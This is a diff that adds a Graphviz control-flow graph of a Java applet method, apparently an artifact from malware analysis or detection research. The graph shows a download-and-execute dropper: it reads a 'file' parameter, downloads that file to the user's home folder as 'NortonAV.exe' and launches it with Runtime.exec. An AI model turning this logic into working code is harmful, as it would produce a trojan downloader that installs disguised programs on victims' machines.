@@ -1,0 +1,48 @@
+digraph "" {
+    "r0 := @this: Carpus"
+    "push \"user.home\""
+    "r0 := @this: Carpus"->"push \"user.home\"";
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"
+    "push \"user.home\""->"staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>";
+    "push \"\\NortonAV.exe\""
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"->"push \"\\NortonAV.exe\"";
+    "virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>"
+    "push \"\\NortonAV.exe\""->"virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>";
+    "store.r r2"
+    "virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>"->"store.r r2";
+    "staticget <java.lang.System: java.io.PrintStream out>"
+    "store.r r2"->"staticget <java.lang.System: java.io.PrintStream out>";
+    "load.r r2"
+    "staticget <java.lang.System: java.io.PrintStream out>"->"load.r r2";
+    "virtualinvoke <java.io.PrintStream: void println(java.lang.String)>"
+    "load.r r2"->"virtualinvoke <java.io.PrintStream: void println(java.lang.String)>";
+    "load.r r0"
+    "virtualinvoke <java.io.PrintStream: void println(java.lang.String)>"->"load.r r0";
+    "load.r r0"->"load.r r0";
+    "push \"file\""
+    "load.r r0"->"push \"file\"";
+    "virtualinvoke <Carpus: java.lang.String getParameter(java.lang.String)>"
+    "push \"file\""->"virtualinvoke <Carpus: java.lang.String getParameter(java.lang.String)>";
+    "virtualinvoke <Carpus: java.lang.String getParameter(java.lang.String)>"->"load.r r2";
+    "virtualinvoke <Carpus: void download(java.lang.String,java.lang.String)>"
+    "load.r r2"->"virtualinvoke <Carpus: void download(java.lang.String,java.lang.String)>";
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"
+    "virtualinvoke <Carpus: void download(java.lang.String,java.lang.String)>"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+    "store.r r0"
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"store.r r0";
+    "store.r r0"->"load.r r0";
+    "load.r r0"->"load.r r2";
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"
+    "load.r r2"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
+    "pop"
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"pop";
+    "goto return"
+    "pop"->"goto return";
+    "return"
+    "goto return"->"return";
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"store.r r0";
+    "store.r r0"->"staticget <java.lang.System: java.io.PrintStream out>";
+    "staticget <java.lang.System: java.io.PrintStream out>"->"load.r r0";
+    "virtualinvoke <java.io.PrintStream: void println(java.lang.Object)>"
+    "load.r r0"->"virtualinvoke <java.io.PrintStream: void println(java.lang.Object)>";
+}
